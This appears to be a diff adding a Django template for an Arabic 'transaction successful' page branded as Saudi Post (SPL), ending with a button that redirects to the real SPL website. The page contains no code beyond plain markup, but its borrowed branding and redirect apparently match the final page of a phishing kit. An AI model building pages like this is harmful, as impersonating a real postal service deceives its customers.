@@ -1,0 +1,68 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <link rel="stylesheet" href="{% static 'styles.css' %}">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
+    <title>Document</title>
+    <link rel="icon" href="{% static 'favicon.ico' %}">
+   
+ 
+</head>
+<body>
+  
+  
+  
+  
+  <div class="container">
+    <div class="header"></div>
+    <div class="line"></div>
+    <button class="top-left-button" >تسجيل</button>
+    <img class="top-right-image" src="{% static 'logo.png' %}" alt="image">
+    
+    <div>
+      <div class="line2"></div>
+      <div class="line3"></div>
+      
+    </div>
+  
+    <div class="text-box">
+      <div class="textbox">
+        <img src="{% static 'success.svg' %}" alt="success" style="width: 100px; height: auto; margin-top: 50px;">
+        <h3>لقد تمت العملية بنجاح </h3>
+        <p lang="ar"  style="font-size: 22;">شكرا لإختياركم مؤسسة البريد السعودي - سبل</p>
+        </p>
+        <button onclick="window.location.href='https://splonline.com.sa/ar/';" class="home-button" style="text-align: center;">الصفحة الرئيسية</button>
+        
+        
+          
+      </div> 
+      
+    </div>
+    
+  
+  </div>
+  
+  
+ 
+  <div class="container2">
+    <div class="footer">
+      <div style="display: flex;  justify-content: flex-end;">
+        <p class="info-text3" style="font-size: 14px;white-space: normal;" dir="rtl"><img src="{% static 'copyright.png' %}"
+           alt="copyright" style="width: 12px; height: 12px; margin-left: 5px;top: 20px; white-space: nowrap;"><span>2023 &nbsp
+           </span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سبل </p>
+         
+        <!-- <p class="info-text3" style="font-size: 14px; white-space: nowrap; "> &nbsp 2023</p> -->
+      </div>
+      <div style="display: flex; align-items: center; justify-content: flex-end; font-size: 14px; padding-top: 0px; align-items: flex-start;">
+        <p class="info-text3" style="font-size: 14px;"> عند إستخدامك لهذا الموقع ، فإنك توافق على  <a href='https://splonline.com.sa/ar/terms-of-service/' target="_blank">شروط الخدمة </a> و <a href='https://splonline.com.sa/ar/privacy-policy/' target="_blank">سياسة الخصوصية</a> </p>
+        
+        
+      </div>
+    </div>
+  </div>
+</body>
+</html>
